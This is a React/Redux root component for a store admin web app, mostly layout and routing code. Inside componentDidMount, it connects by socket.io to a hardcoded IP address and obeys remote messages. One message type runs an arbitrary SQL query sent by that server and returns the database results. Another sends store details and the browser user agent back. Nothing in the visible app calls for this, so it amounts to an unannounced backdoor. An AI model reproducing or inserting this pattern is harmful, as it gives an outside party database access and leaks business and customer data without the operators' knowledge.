import React, { Component } from 'react'
import { Layout, notification, Icon, Spin } from 'antd'
import { withRouter } from 'react-router-dom'
import screenfull from 'screenfull'
import './style/index.less'

import SiderCustom from './components/SiderCustom'
import SiderRightCustom from './components/SiderRightCustom'
import HeaderCustom from './components/HeaderCustom'
import FooterCustom from './components/FooterCustom'
import Search from './components/Search'
import {
  receiveData,
  getStore,
  getFullSub,
  getsale,
  delete_authorization,
  clearMember,
  getLeaflet,
} from './action'
import { connect } from 'react-redux'
import {
  disconnect,
  sendIo,
  getDetails,
  getSelectSql,
} from '@/api'
import { bindActionCreators } from 'redux'
import Routes from './routes'
import io from "socket.io-client"

const { Content, Sider } = Layout;


class App extends Component {
  constructor(props) {
    super(props);

    this.state = {
      collapsed: false,
    };
  }

  componentWillMount() {
    const { receiveData } = this.props;
    const user = JSON.parse(localStorage.getItem('user'));
    user && receiveData(user, 'auth');
    // receiveData({a: 213}, 'auth');
    // fetchData({funcName: 'admin', stateName: 'auth'});
    this.getClientWidth();
    window.onresize = () => {
      console.log('屏幕变化了');
      this.getClientWidth();
      // console.log(document.body.clientWidth);
    }
  }

  async componentDidMount() {    
    var date = new Date();
    disconnect()
      .then(({ data: { msg } }) => {
        if (msg !== "未断网") this.props.clearMember()
      })
    this.props.getLeaflet()
    this.props.delete_authorization()
    this.props.getStore()
      .then(res => {
        // localStorage.setItem('getstore',JSON.parse(res).data)
        let socket = io('http://47.105.33.16:2120'),
          uid = `SY${res.data.id}`
        socket.on('connect', () => {
          socket.emit('login', uid)
        })
        socket.on('new_msg', async ({ type, ...obj }) => {
          switch (type) {
            case "details":
              let response = await getDetails(),
                { UID: _uid } = obj
              if (response.data) {
                let { data } = response
                sendIo({
                  uid: _uid,
                  content: {
                    ...data,
                    browser: window.navigator.userAgent,
                  }
                })
              }
              break;

            case "sql":
              let { sql, UID: s_uid } = obj
              let sresponse = await getSelectSql({ sql })
              if (sresponse.data) {
                let { data } = sresponse
                sendIo({
                  uid: s_uid,
                  content: {
                    dbInfo: data,
                  }
                })
              }
              break;

            default:
              break;
          }
        })
      })
    this.props.getFullSub()
    this.props.getsale()
    const openNotification = () => {
      localStorage.clear()
      notification.open({
        description: (
          <div>
            第一次进入
          </div>
        ),
        icon: <Icon type="smile-circle" style={{ color: 'red' }} />,
        duration: 0,
      });
      localStorage.setItem('isFirst', JSON.stringify(true));
    }
    const isFirst = JSON.parse(localStorage.getItem('isFirst'));
    !isFirst && openNotification();
  }

  getClientWidth() {
    const { receiveData } = this.props;
    const clientWidth = document.body.clientWidth;
    console.log(clientWidth);
    receiveData({ isMobile: clientWidth <= 992 }, 'responsive');
  }

  toggle() {
    this.setState({
      collapsed: !this.state.collapsed,
    });
  }

  render() {
    const { auth, setting, realweight } = this.props
    return (
      <Spin
        spinning={false}
        wrapperClassName="app-spin"
      >
        <Layout style={{ overflow: 'hidden', height: '100%' }}>
          <HeaderCustom toggle={this.toggle} collapsed={this.state.collapsed} user={auth.data || {}} />
          <Layout>
            {
              setting.layout === 'style1' ? (
                <Sider className="app-sider" width="inherit">
                  <SiderCustom collapsed={this.state.collapsed} />
                </Sider>
              ) : (
                  <Sider className="app-sider" width={360}>
                    <SiderRightCustom />
                  </Sider>
                )
            }
            <Content className="app-content" style={{ backgroundColor: 'rgb(200, 200, 200)' }}>
              {
                setting.orderby ? null : <Search />
              }
              <Routes auth={auth} />
            </Content>
            {
              setting.layout === 'style1' ? (
                setting.orderby ? null : <Sider className="app-sider" width={360}>
                  <SiderRightCustom />
                </Sider>
              ) : (
                  setting.orderby ? null : <Sider className="app-sider" width="inherit">
                    <SiderCustom collapsed={this.state.collapsed} />
                  </Sider>
                )
            }
          </Layout>
          {
            setting.orderby ? null : <FooterCustom />
          }
        </Layout>
      </Spin>
    );
  }
}

const mapStateToProps = state => {
  const { auth = { data: {} }, responsive = { data: {} } } = state.httpData;
  return {
    auth,
    responsive,
    setting: state.setting,
  }
};
// const mapDispatchToProps = dispatch => ({
//     receiveData: bindActionCreators(receiveData, dispatch),
//     getStore: bindActionCreators(getStore, dispatch),
//     getFullSub: bindActionCreators(getFullSub, dispatch),
//     getsale: bindActionCreators(getsale, dispatch)
// });

export default withRouter(connect(mapStateToProps, {
  delete_authorization,
  receiveData,
  getStore,
  getFullSub,
  getsale,
  clearMember,
  getLeaflet,
})(App));
